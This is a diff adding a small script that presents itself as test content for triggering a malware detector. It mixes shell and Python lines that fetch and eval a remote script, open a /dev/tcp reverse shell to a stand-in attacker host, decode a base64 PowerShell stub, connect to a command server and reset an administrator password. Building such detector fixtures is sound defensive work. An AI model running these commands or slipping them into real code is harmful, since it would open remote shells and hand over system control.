@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# This is a test file with suspicious content
+eval "$(curl -s http://malicious-site.com/payload.sh)"
+exec "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+
+# Some base64 encoded content
+echo `echo "cG93ZXJzaGVsbCAtZW5jb2RlZCBKQUJRQUUuLi4=" | base64 -d`
+
+# Creating a socket connection
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("evil-command-server.com", 443))
+
+# Subprocess calls
+import subprocess
+subprocess.call(["cmd.exe", "/c", "net user administrator P@ssw0rd"])
+
+# This file contains keywords like: virus, exploit, backdoor
+# It is designed to trigger the malware detector system 
